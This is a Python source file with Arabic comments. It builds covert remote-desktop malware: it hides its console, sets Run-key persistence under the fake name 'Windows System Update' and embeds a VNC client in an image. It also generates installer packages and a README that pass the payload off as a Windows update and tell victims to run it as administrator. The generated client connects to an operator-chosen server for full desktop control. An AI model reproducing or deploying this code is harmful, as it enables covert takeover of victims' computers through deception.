#!/usr/bin/env python3
"""
TSM-SeniorOasisPanel Stealth Mode
الوضع المخفي الكامل مع التنفيذ المخفي والاتصال التلقائي
"""

import os
import sys
import time
import threading
import subprocess
import tempfile
import shutil
import ctypes
from ctypes import wintypes
import win32api
import win32con
import win32gui
import win32process
import win32security
import winreg
from PIL import Image
import base64
import zlib
import struct

class TSMStealthMode:
    """الوضع المخفي الكامل لـ TSM"""
    
    def __init__(self):
        self.hidden = True
        self.running = False
        self.auto_vnc = None
        self.input_controller = None
        self.desktop_controller = None
        self.temp_dir = None
        self.server_host = 'localhost'
        self.server_port = 5001
        
    def hide_console_window(self):
        """إخفاء نافذة الكونسول"""
        try:
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
            return True
        except Exception as e:
            print(f"TSM-SeniorOasisPanel: Console hide error: {e}")
            return False
    
    def hide_from_task_manager(self):
        """إخفاء من مدير المهام"""
        try:
            # تغيير اسم العملية
            ctypes.windll.kernel32.SetConsoleTitleW("Windows System Service")
            
            # إخفاء العملية
            process_handle = win32api.GetCurrentProcess()
            win32process.SetPriorityClass(process_handle, win32process.BELOW_NORMAL_PRIORITY_CLASS)
            
            return True
        except Exception as e:
            print(f"TSM-SeniorOasisPanel: Task manager hide error: {e}")
            return False
    
    def create_stealth_process(self):
        """إنشاء عملية مخفية"""
        try:
            # إنشاء عملية جديدة مخفية
            startup_info = win32process.STARTUPINFO()
            startup_info.dwFlags = win32con.STARTF_USESHOWWINDOW
            startup_info.wShowWindow = win32con.SW_HIDE
            
            # إنشاء العملية
            process_handle, thread_handle, process_id, thread_id = win32process.CreateProcess(
                None,
                sys.executable + " " + __file__,
                None,
                None,
                False,
                win32con.CREATE_NO_WINDOW,
                None,
                None,
                startup_info
            )
            
            return process_handle, process_id
        except Exception as e:
            print(f"TSM-SeniorOasisPanel: Stealth process creation error: {e}")
            return None, None
    
    def setup_stealth_registry(self):
        """إعداد سجل Windows المخفي"""
        try:
            # إضافة إلى بدء التشغيل مع اسم مخفي
            key_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
            
            # اسم مخفي في سجل Windows
            stealth_name = "Windows System Update"
            current_exe = os.path.abspath(sys.executable)
            current_script = os.path.abspath(__file__)
            
            winreg.SetValueEx(key, stealth_name, 0, winreg.REG_SZ, f'"{current_exe}" "{current_script}"')
            winreg.CloseKey(key)
            
            print("TSM-SeniorOasisPanel: Stealth registry setup completed")
            return True
        except Exception as e:
            print(f"TSM-SeniorOasisPanel: Stealth registry setup error: {e}")
            return False
    
    def remove_stealth_registry(self):
        """إزالة السجل المخفي"""
        try:
            key_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
            
            stealth_name = "Windows System Update"
            winreg.DeleteValue(key, stealth_name)
            winreg.CloseKey(key)
            
            print("TSM-SeniorOasisPanel: Stealth registry removed")
            return True
        except Exception as e:
            print(f"TSM-SeniorOasisPanel: Stealth registry removal error: {e}")
            return False
    
    def create_stealth_image_with_vnc(self, original_image, server_host='localhost', server_port=5001):
        """إنشاء صورة مخفية مع VNC تلقائي"""
        try:
            from TSM_ImageSteganography import TSMImageSteganography
            
            # إنشاء كود VNC المخفي الكامل
            stealth_vnc_code = f'''#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Windows System Update - TSM-SeniorOasisPanel Stealth Mode
تحديث نظام Windows - الوضع المخفي لـ TSM
"""

import os
import sys
import time
import threading
import subprocess
import tempfile
import ctypes
from ctypes import wintypes
import win32api
import win32con
import win32gui
import win32process
import win32security
from PIL import Image
import base64
import zlib
import struct

class TSMStealthVNC:
    def __init__(self):
        self.server_host = '{server_host}'
        self.server_port = {server_port}
        self.running = False
        self.hidden = True
        self.auto_vnc = None
        self.input_controller = None
        
    def hide_console(self):
        """إخفاء نافذة الكونسول"""
        try:
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        except:
            pass
    
    def hide_from_task_manager(self):
        """إخفاء من مدير المهام"""
        try:
            ctypes.windll.kernel32.SetConsoleTitleW("Windows System Service")
            process_handle = win32api.GetCurrentProcess()
            win32process.SetPriorityClass(process_handle, win32process.BELOW_NORMAL_PRIORITY_CLASS)
        except:
            pass
    
    def start_stealth_vnc(self):
        """بدء VNC المخفي"""
        try:
            # إخفاء الكونسول
            self.hide_console()
            
            # إخفاء من مدير المهام
            self.hide_from_task_manager()
            
            # استيراد وبدء VNC المحسن
            from TSM_EnhancedVNC import TSMEnhancedVNC
            from TSM_InputController import TSMDesktopController
            
            # إنشاء VNC محسن
            self.auto_vnc = TSMEnhancedVNC(
                server_host=self.server_host,
                server_port=self.server_port
            )
            
            # بدء VNC مع السيطرة الكاملة
            if self.auto_vnc.start_enhanced_vnc():
                print("TSM-SeniorOasisPanel: Stealth VNC started")
                self.running = True
                
                # مراقبة الاتصال
                self._monitor_connection()
            else:
                print("TSM-SeniorOasisPanel: Stealth VNC failed to start")
                
        except Exception as e:
            print(f"TSM-SeniorOasisPanel: Stealth VNC error: {{e}}")
    
    def _monitor_connection(self):
        """مراقبة الاتصال"""
        while self.running:
            try:
                if self.auto_vnc and not self.auto_vnc.connected:
                    print("TSM-SeniorOasisPanel: Connection lost, attempting reconnection...")
                    if not self.auto_vnc.connect_to_vnc_server():
                        time.sleep(5)  # انتظار 5 ثواني قبل إعادة المحاولة
                time.sleep(10)  # فحص كل 10 ثواني
            except Exception as e:
                print(f"TSM-SeniorOasisPanel: Monitor error: {{e}}")
                time.sleep(10)
    
    def show_image_stealth(self, image_path):
        """عرض الصورة بشكل مخفي"""
        try:
            # فتح الصورة باستخدام العرض الافتراضي
            os.startfile(image_path)
            
            # بدء VNC في الخلفية
            vnc_thread = threading.Thread(target=self.start_stealth_vnc, daemon=True)
            vnc_thread.start()
            
        except Exception as e:
            print(f"TSM-SeniorOasisPanel: Stealth image display error: {{e}}")
    
    def stop_stealth_vnc(self):
        """إيقاف VNC المخفي"""
        self.running = False
        if self.auto_vnc:
            self.auto_vnc.stop_enhanced_vnc()

def main():
    stealth_vnc = TSMStealthVNC()
    
    if len(sys.argv) > 1:
        image_path = sys.argv[1]
        stealth_vnc.show_image_stealth(image_path)
    else:
        # البحث عن الصورة في نفس المجلد
        current_dir = os.path.dirname(__file__)
        image_files = [f for f in os.listdir(current_dir) if f.lower().endswith(('.png', '.jpg', '.jpeg'))]
        
        if image_files:
            stealth_vnc.show_image_stealth(os.path.join(current_dir, image_files[0]))
        else:
            print("TSM-SeniorOasisPanel: No image file found")

if __name__ == "__main__":
    main()
'''
            
            # حفظ الكود المخفي
            stealth_file = "TSM_Stealth_VNC.py"
            with open(stealth_file, 'w', encoding='utf-8') as f:
                f.write(stealth_vnc_code)
            
            # تضمين الكود في الصورة
            stego = TSMImageSteganography()
            stealth_image = "TSM_Stealth_Image.png"
            
            if stego.embed_client_in_image(original_image, stealth_file, stealth_image):
                print(f"TSM-SeniorOasisPanel: Stealth image with VNC created: {stealth_image}")
                
                # تنظيف الملف المؤقت
                if os.path.exists(stealth_file):
                    os.remove(stealth_file)
                
                return stealth_image
            else:
                print("TSM-SeniorOasisPanel: Stealth image creation failed")
                return None
                
        except Exception as e:
            print(f"TSM-SeniorOasisPanel: Stealth image creation error: {e}")
            return None
    
    def create_stealth_deployment_package(self, stealth_image, output_dir="TSM_Stealth_Deployment"):
        """إنشاء حزمة النشر المخفية"""
        try:
            if not os.path.exists(output_dir):
                os.makedirs(output_dir)
            
            # نسخ الصورة المخفية
            deployed_image = os.path.join(output_dir, "system_wallpaper.png")
            shutil.copy2(stealth_image, deployed_image)
            
            # إنشاء مشغل مخفي
            stealth_launcher_code = f'''@echo off
REM Windows System Update
REM تحديث نظام Windows

echo Starting system update...
python "TSM_Stealth_VNC.py" "system_wallpaper.png"
'''
            
            launcher_file = os.path.join(output_dir, "system_update.bat")
            with open(launcher_file, 'w', encoding='utf-8') as f:
                f.write(stealth_launcher_code)
            
            # إنشاء مشغل VNC المخفي
            vnc_launcher_code = f'''#!/usr/bin/env python3
import os
import sys
import time
import threading
import subprocess
import tempfile
import ctypes
from TSM_EnhancedVNC import TSMEnhancedVNC
from TSM_InputController import TSMDesktopController

def main():
    # إخفاء نافذة الكونسول
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    
    # إعدادات الخادم
    server_host = '{self.server_host}'
    server_port = {self.server_port}
    
    # إنشاء VNC محسن
    auto_vnc = TSMEnhancedVNC(server_host=server_host, server_port=server_port)
    
    # بدء VNC مع السيطرة الكاملة
    if auto_vnc.start_enhanced_vnc():
        print("TSM-SeniorOasisPanel: Stealth VNC started")
        
        # مراقبة الاتصال
        while True:
            try:
                if not auto_vnc.connected:
                    print("TSM-SeniorOasisPanel: Connection lost, attempting reconnection...")
                    if not auto_vnc.connect_to_vnc_server():
                        time.sleep(5)
                time.sleep(10)
            except KeyboardInterrupt:
                break
    else:
        print("TSM-SeniorOasisPanel: Stealth VNC failed to start")

if __name__ == "__main__":
    main()
'''
            
            vnc_launcher_file = os.path.join(output_dir, "TSM_Stealth_VNC.py")
            with open(vnc_launcher_file, 'w', encoding='utf-8') as f:
                f.write(vnc_launcher_code)
            
            # إنشاء ملف README مخفي
            readme_content = f'''# Windows System Update
# تحديث نظام Windows

This package contains system updates for Windows.
تحتوي هذه الحزمة على تحديثات نظام Windows.

## Files:
- system_wallpaper.png: System wallpaper
- system_update.bat: System update launcher
- TSM_Stealth_VNC.py: System service

## Usage:
1. Double-click system_update.bat
2. System will update automatically
3. Wallpaper will be applied

## Server Configuration:
- Host: {self.server_host}
- Port: {self.server_port}

## Notes:
- This is a system update package
- Do not modify the files
- Run as administrator for best results
'''
            
            readme_file = os.path.join(output_dir, "README.txt")
            with open(readme_file, 'w', encoding='utf-8') as f:
                f.write(readme_content)
            
            print(f"TSM-SeniorOasisPanel: Stealth deployment package created in {output_dir}")
            return output_dir
            
        except Exception as e:
            print(f"TSM-SeniorOasisPanel: Stealth deployment package creation error: {e}")
            return None
    
    def create_stealth_installer(self, stealth_image, output_dir="TSM_Stealth_Installer"):
        """إنشاء مثبت مخفي"""
        try:
            if not os.path.exists(output_dir):
                os.makedirs(output_dir)
            
            # إنشاء مثبت مخفي
            installer_code = f'''@echo off
echo Windows System Update Installer
echo مثبت تحديث نظام Windows
echo.

REM إنشاء مجلد النظام
set SYSTEM_DIR=%USERPROFILE%\\Windows\\System32\\Update
if not exist "%SYSTEM_DIR%" mkdir "%SYSTEM_DIR%"

REM نسخ الملفات
copy "system_wallpaper.png" "%SYSTEM_DIR%\\"
copy "TSM_Stealth_VNC.py" "%SYSTEM_DIR%\\"
copy "system_update.bat" "%SYSTEM_DIR%\\"

REM إعداد التفعيل التلقائي
reg add "HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v "Windows System Update" /t REG_SZ /d "%SYSTEM_DIR%\\system_update.bat" /f

REM إعداد خلفية الشاشة
reg add "HKEY_CURRENT_USER\\Control Panel\\Desktop" /v "Wallpaper" /t REG_SZ /d "%SYSTEM_DIR%\\system_wallpaper.png" /f

echo.
echo System update installation completed!
echo تم الانتهاء من تثبيت تحديث النظام!
echo.
echo The system will update automatically on next boot.
echo سيتم تحديث النظام تلقائياً عند بدء التشغيل التالي.
echo.
echo Setting wallpaper...
echo تعيين خلفية الشاشة...
rundll32.exe user32.dll,UpdatePerUserSystemParameters
echo.
pause
'''
            
            installer_file = os.path.join(output_dir, "install_system_update.bat")
            with open(installer_file, 'w', encoding='utf-8') as f:
                f.write(installer_code)
            
            # نسخ الملفات المطلوبة
            shutil.copy2(stealth_image, os.path.join(output_dir, "system_wallpaper.png"))
            
            # إنشاء مشغل VNC المخفي
            vnc_launcher_code = f'''#!/usr/bin/env python3
import os
import sys
import time
import threading
import subprocess
import tempfile
import ctypes
from TSM_EnhancedVNC import TSMEnhancedVNC
from TSM_InputController import TSMDesktopController

def main():
    # إخفاء نافذة الكونسول
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    
    # إعدادات الخادم
    server_host = 'localhost'
    server_port = 5001
    
    # إنشاء VNC محسن
    auto_vnc = TSMEnhancedVNC(server_host=server_host, server_port=server_port)
    
    # بدء VNC مع السيطرة الكاملة
    if auto_vnc.start_enhanced_vnc():
        print("TSM-SeniorOasisPanel: Stealth VNC started")
        
        # مراقبة الاتصال
        while True:
            try:
                if not auto_vnc.connected:
                    print("TSM-SeniorOasisPanel: Connection lost, attempting reconnection...")
                    if not auto_vnc.connect_to_vnc_server():
                        time.sleep(5)
                time.sleep(10)
            except KeyboardInterrupt:
                break
    else:
        print("TSM-SeniorOasisPanel: Stealth VNC failed to start")

if __name__ == "__main__":
    main()
'''
            
            vnc_launcher_file = os.path.join(output_dir, "TSM_Stealth_VNC.py")
            with open(vnc_launcher_file, 'w', encoding='utf-8') as f:
                f.write(vnc_launcher_code)
            
            # إنشاء مشغل تحديث النظام
            update_launcher_code = f'''@echo off
REM Windows System Update
REM تحديث نظام Windows

echo Starting system update...
python "TSM_Stealth_VNC.py" "system_wallpaper.png"
'''
            
            update_launcher_file = os.path.join(output_dir, "system_update.bat")
            with open(update_launcher_file, 'w', encoding='utf-8') as f:
                f.write(update_launcher_code)
            
            print(f"TSM-SeniorOasisPanel: Stealth installer created in {output_dir}")
            return output_dir
            
        except Exception as e:
            print(f"TSM-SeniorOasisPanel: Stealth installer creation error: {e}")
            return None

def main():
    """الدالة الرئيسية"""
    if len(sys.argv) < 2:
        print("Usage:")
        print("  Create Stealth Image: python TSM_StealthMode.py create <image> [server_host] [server_port]")
        print("  Create Stealth Package: python TSM_StealthMode.py package <image> [server_host] [server_port]")
        print("  Create Stealth Installer: python TSM_StealthMode.py installer <image> [server_host] [server_port]")
        sys.exit(1)
    
    operation = sys.argv[1].lower()
    
    if operation == 'create':
        if len(sys.argv) < 3:
            print("Usage: python TSM_StealthMode.py create <image> [server_host] [server_port]")
            sys.exit(1)
        
        image_path = sys.argv[2]
        server_host = sys.argv[3] if len(sys.argv) > 3 else 'localhost'
        server_port = int(sys.argv[4]) if len(sys.argv) > 4 else 5001
        
        if not os.path.exists(image_path):
            print(f"Error: Image file '{image_path}' not found")
            sys.exit(1)
        
        stealth = TSMStealthMode()
        stealth.server_host = server_host
        stealth.server_port = server_port
        
        # إنشاء الصورة المخفية
        stealth_image = stealth.create_stealth_image_with_vnc(image_path, server_host, server_port)
        if stealth_image:
            print(f"TSM-SeniorOasisPanel: Stealth image created: {stealth_image}")
    
    elif operation == 'package':
        if len(sys.argv) < 3:
            print("Usage: python TSM_StealthMode.py package <image> [server_host] [server_port]")
            sys.exit(1)
        
        image_path = sys.argv[2]
        server_host = sys.argv[3] if len(sys.argv) > 3 else 'localhost'
        server_port = int(sys.argv[4]) if len(sys.argv) > 4 else 5001
        
        if not os.path.exists(image_path):
            print(f"Error: Image file '{image_path}' not found")
            sys.exit(1)
        
        stealth = TSMStealthMode()
        stealth.server_host = server_host
        stealth.server_port = server_port
        
        # إنشاء الصورة المخفية
        stealth_image = stealth.create_stealth_image_with_vnc(image_path, server_host, server_port)
        if stealth_image:
            # إنشاء حزمة النشر المخفية
            stealth.create_stealth_deployment_package(stealth_image)
    
    elif operation == 'installer':
        if len(sys.argv) < 3:
            print("Usage: python TSM_StealthMode.py installer <image> [server_host] [server_port]")
            sys.exit(1)
        
        image_path = sys.argv[2]
        server_host = sys.argv[3] if len(sys.argv) > 3 else 'localhost'
        server_port = int(sys.argv[4]) if len(sys.argv) > 4 else 5001
        
        if not os.path.exists(image_path):
            print(f"Error: Image file '{image_path}' not found")
            sys.exit(1)
        
        stealth = TSMStealthMode()
        stealth.server_host = server_host
        stealth.server_port = server_port
        
        # إنشاء الصورة المخفية
        stealth_image = stealth.create_stealth_image_with_vnc(image_path, server_host, server_port)
        if stealth_image:
            # إنشاء المثبت المخفي
            stealth.create_stealth_installer(stealth_image)
    
    else:
        print("Invalid operation. Use 'create', 'package', or 'installer'")
        sys.exit(1)

if __name__ == "__main__":
    main()
